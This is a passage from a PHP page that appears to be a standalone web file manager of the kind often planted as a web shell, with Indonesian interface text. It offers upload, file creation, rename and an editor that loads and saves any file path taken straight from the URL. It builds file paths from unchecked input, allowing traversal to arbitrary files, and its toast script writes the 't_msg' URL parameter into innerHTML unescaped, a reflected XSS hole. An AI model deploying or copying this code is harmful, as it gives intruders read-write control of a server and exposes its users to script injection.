  <form method="post" enctype="multipart/form-data" style="flex:1;min-width:240px">
    <div class="toolbox">
      <i class="fa-solid fa-cloud-arrow-up toolbox-icon"></i>
      <span class="toolbox-lbl">Upload</span>
      <div class="file-drop" id="fileDrop">
        <input type="file" name="file" id="fileInput" onchange="handleFileChange(this)">
        <div class="file-drop-label">
          <i class="fa-solid fa-paperclip"></i>
          <span class="fdn" id="fileName">Pilih atau drag file…</span>
        </div>
      </div>
      <button type="submit" name="upload" class="btn btn-v"><i class="fa-solid fa-upload"></i> Upload</button>
    </div>
  </form>
  <form method="post" style="flex:1;min-width:240px">
    <div class="toolbox">
      <i class="fa-solid fa-file-circle-plus toolbox-icon"></i>
      <span class="toolbox-lbl">New File</span>
      <input type="text" name="new_file_name" placeholder="filename.txt" required>
      <button type="submit" name="create_file" class="btn btn-c"><i class="fa-solid fa-plus"></i> Create</button>
    </div>
  </form>
</div>

<!-- ── FILE TABLE ── -->
<div class="section-label"><i class="fa-solid fa-list"></i> File &amp; Folder</div>
<div class="tbl-wrap">
  <table>
    <thead>
      <tr>
        <th style="width:42%"><i class="fa-solid fa-file"></i> Nama</th>
        <th style="width:10%"><i class="fa-solid fa-weight-hanging"></i> Ukuran</th>
        <th style="width:20%"><i class="fa-regular fa-clock"></i> Diubah</th>
        <th><i class="fa-solid fa-bolt"></i> Aksi</th>
      </tr>
    </thead>
    <tbody><?php listDirectory($current_dir);?></tbody>
  </table>
</div>

<!-- ── RENAME PANEL ── -->
<?php if(isset($_GET['rename'])):?>
<div class="section-label"><i class="fa-solid fa-pen"></i> Rename</div>
<div class="panel">
  <div class="panel-hdr">
    <div class="panel-hdr-icon"><i class="fa-solid fa-pen"></i></div>
    <div class="panel-hdr-title">Rename<span class="panel-hdr-name">— <?=htmlspecialchars($_GET['rename'])?></span></div>
  </div>
  <div class="panel-body">
    <form method="post" style="display:flex;gap:10px;flex-wrap:wrap;align-items:center">
      <input type="hidden" name="old_name" value="<?=htmlspecialchars($_GET['rename'])?>">
      <input type="text" name="new_name" placeholder="Nama baru…" class="field" style="flex:1;min-width:200px" required>
      <button type="submit" name="rename_file" class="btn btn-v"><i class="fa-solid fa-check"></i> Rename</button>
      <a href="?dir=<?=urlencode($current_dir)?>" class="btn btn-ghost"><i class="fa-solid fa-xmark"></i> Batal</a>
    </form>
  </div>
</div>
<?php endif;?>

<!-- ── EDIT PANEL ── -->
<?php if(isset($_GET['edit'])):$fp=$current_dir.'/'.$_GET['edit'];if(is_file($fp)):$fc2=file_get_contents($fp);$fsize=fmt_size(filesize($fp));$fext=strtolower(pathinfo($fp,PATHINFO_EXTENSION));?>
<div class="section-label"><i class="fa-solid fa-code"></i> Editor</div>
<div class="panel">
  <div class="panel-hdr">
    <div class="panel-hdr-icon"><i class="fa-solid fa-file-code"></i></div>
    <div class="panel-hdr-title">Editing<span class="panel-hdr-name">— <?=htmlspecialchars($_GET['edit'])?></span></div>
  </div>
  <div class="panel-body">
    <div class="editor-meta">
      <span><i class="fa-solid fa-file"></i> <?=htmlspecialchars($_GET['edit'])?></span>
      <span><i class="fa-solid fa-weight-hanging"></i> <?=$fsize?></span>
      <span><i class="fa-solid fa-code"></i> <?=strtoupper($fext)?:' — '?></span>
      <span><i class="fa-regular fa-clock"></i> <?=date('d M Y H:i',filemtime($fp))?></span>
    </div>
    <form method="post">
      <input type="hidden" name="file_name" value="<?=htmlspecialchars($_GET['edit'])?>">
      <textarea name="file_content" class="field"><?=htmlspecialchars($fc2)?></textarea>
      <div style="margin-top:12px;display:flex;gap:10px;flex-wrap:wrap;align-items:center">
        <button type="submit" name="save_file" class="btn btn-save"><i class="fa-solid fa-floppy-disk"></i> Simpan Perubahan</button>
        <a href="?dir=<?=urlencode($current_dir)?>" class="btn btn-ghost"><i class="fa-solid fa-xmark"></i> Batal</a>
      </div>
    </form>
  </div>
</div>
<?php endif;endif;?>

</div><!-- /wrap -->

<!-- ── TOAST ── -->
<div id="tc"></div>

<script>
(function(){
  const p=new URLSearchParams(location.search);
  const t=p.get('t_type'),m=p.get('t_msg');
  if(!t||!m)return;
  history.replaceState(null,'','?dir='+encodeURIComponent(p.get('dir')||''));
  showToast(t,m);
})();

function showToast(type,msg,dur){
  dur=dur||4800;
  const isOk=type==='success';
  const el=document.createElement('div');
  el.className='toast '+(isOk?'toast-ok':'toast-err');
  el.style.setProperty('--dur',(dur/1000)+'s');
  el.innerHTML=
    '<div class="toast-stripe"></div>'+
    '<div class="toast-inner">'+
      '<div class="toast-ico"><i class="fa-solid '+(isOk?'fa-circle-check':'fa-circle-xmark')+'"></i></div>'+
      '<div class="toast-content">'+
        '<div class="toast-title">'+(isOk?'Berhasil':'Gagal')+'</div>'+
        '<div class="toast-msg">'+msg+'</div>'+
      '</div>'+
    '</div>'+
    '<button class="toast-x" title="Tutup"><i class="fa-solid fa-xmark"></i></button>'+
    '<div class="tbar"></div>';
  document.getElementById('tc').appendChild(el);
  var gone=false;
  function dismiss(){
    if(gone)return;gone=true;
    el.classList.add('hiding');
    el.addEventListener('animationend',function(){el.remove()},{once:true});
  }
  el.querySelector('.toast-x').addEventListener('click',function(e){e.stopPropagation();dismiss()});
  el.addEventListener('click',dismiss);
  var t=setTimeout(dismiss,dur);
  el.addEventListener('mouseenter',function(){clearTimeout(t)});
  el.addEventListener('mouseleave',function(){t=setTimeout(dismiss,1500)});
}
</script>
<script>
function handleFileChange(input){
  var drop=document.getElementById('fileDrop');
  var label=document.getElementById('fileName');
  if(input.files&&input.files.length>0){
    var f=input.files[0];
    var sz=f.size<1024?f.size+' B':f.size<1048576?(f.size/1024).toFixed(1)+' KB':(f.size/1048576).toFixed(1)+' MB';
    label.textContent=f.name+' ('+sz+')';
    drop.classList.add('has-file');
  } else {
    label.textContent='Pilih atau drag file…';
    drop.classList.remove('has-file');
  }
}

// Drag & drop
(function(){
  var drop=document.getElementById('fileDrop');
  if(!drop)return;
  ['dragenter','dragover'].forEach(function(ev){
    drop.addEventListener(ev,function(e){e.preventDefault();drop.classList.add('drag-over')});
  });
  ['dragleave','dragend','drop'].forEach(function(ev){
    drop.addEventListener(ev,function(e){drop.classList.remove('drag-over')});
  });
  drop.addEventListener('drop',function(e){
    e.preventDefault();
    var inp=document.getElementById('fileInput');
    if(e.dataTransfer.files.length){
      inp.files=e.dataTransfer.files;
      handleFileChange(inp);
    }
  });
})();
</script>
</body>
</html>